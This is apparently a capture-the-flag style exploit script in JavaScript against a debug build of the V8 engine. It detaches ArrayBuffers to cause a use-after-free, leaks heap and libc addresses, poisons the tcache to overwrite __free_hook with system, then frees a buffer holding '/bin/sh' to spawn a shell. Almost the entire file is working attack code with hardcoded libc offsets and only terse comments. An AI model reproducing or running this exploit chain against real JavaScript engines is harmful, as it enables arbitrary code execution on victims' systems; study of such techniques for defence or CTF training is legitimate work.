function gc(){
    for(var i = 0; i < 1024 * 1024* 16; i++){
        new String;
    }
}

function f2i(f){
    float64 = new Float64Array(1);
    float64[0] = f;
    int32 = new Uint32Array(float64.buffer);
    return int32[1] * 0x100000000 + int32[0];
}

function i2f(i){
	int32 = new Uint32Array(2);
	int32[1] = i / 0x100000000;
	int32[0] = i % 0x100000000;
	float64 = new Float64Array(int32.buffer);
	return float64[0];
}

function hex(i){
    return '0x'+i.toString(16).padStart(16, '0');
}

// ArrayBuffer use calloc so tcache won't be used
function calloc(size){
	var a = new Uint8Array(size);
	return a;
}

function malloc(size){
	var a = {};
	a.length = size;
	var b = new Uint8Array(a);
	return b;
}

// free(array.buffer)
function free(a){
	return %ArrayBufferDetach(a);
}

function b2i(a){
	var b = new BigUint64Array(a.buffer);
	return b[0];
}



/* function check for malloc/calloc/free
var c0 = calloc(0x200);
%DebugPrint(c0.buffer);
free(c0.buffer);
%SystemBreak();
var c1 = malloc(0x200);
%DebugPrint(c1.buffer);
%SystemBreak();
*/

// try to free a binsh chunk
// binsh: 2f62696e2f7368
var binsh_chunk = new Uint8Array(0x200);
binsh_chunk[7] = 0x00;
binsh_chunk[6] = 0x68;
binsh_chunk[5] = 0x73;
binsh_chunk[4] = 0x2f;
binsh_chunk[3] = 0x6e;
binsh_chunk[2] = 0x69;
binsh_chunk[1] = 0x62;
binsh_chunk[0] = 0x2f;
//%DebugPrint(binsh_chunk.buffer);


var overchunk = calloc(0x3000);
var c0 = calloc(0x800);
var c1 = calloc(0x800);
//%DebugPrint(c0.buffer);
//%DebugPrint(c1.buffer);
free(c0.buffer);
free(c1.buffer);
//%SystemBreak();
overchunk.set(c1);
var heap_leak = b2i(overchunk.slice(0, 8));
var libc_leak = b2i(overchunk.slice(8, 16)); // main_arena+96
console.log('libc_leak: '+hex(libc_leak));
var libc_base = libc_leak-0x00007f7f8e78dca0n+0x7f7f8e3a2000n
console.log('libc_base: '+hex(libc_base));
/*
========== function ==========
system:0x4f440
execve:0xe4e30
open:0x7a0ce0
read:0x7a0340
write:0x7a0270
gets:0x800b0
setcontext+0x35:0x520a5
========== variables ==========
__malloc_hook(0x3ebc30)             : 0x0000000000000000
__free_hook(0x3ed8e8)               : 0x0000000000000000
__realloc_hook(0x3ebc28)            : 0x00007fc640ebb790
stdin(0x3ec850)                     : 0x00007fc64120ea00
stdout(0x3ec848)                    : 0x00007fc64120f760
_IO_list_all(0x3ec660)              : 0x00007fc64120f680
__after_morecore_hook(0x3ed8e0)     : 0x0000000000000000
*/
var free_hook = libc_base+0x3ed8e8n
console.log('free_hook: '+hex(free_hook));
var system = libc_base+0x4f440n
console.log('system: '+hex(system));

// tcache dup to free_hook
var c2 = calloc(0x200);
var c3 = calloc(0x200);
%DebugPrint(c3.buffer);
free(c2.buffer);
free(c3.buffer);

function i2l(i){
	var b = new Uint8Array(BigUint64Array.from([i]).buffer);
	return b;
}

c3.set(i2l(free_hook)); // fd->free_hook

// change free_hook to system
var c4 = malloc(0x200);
var c5 = malloc(0x200); // got free_hook
c5.set(i2l(system)); // free_hook = system
console.log('Trigger!')
free(binsh_chunk.buffer);

//%SystemBreak();



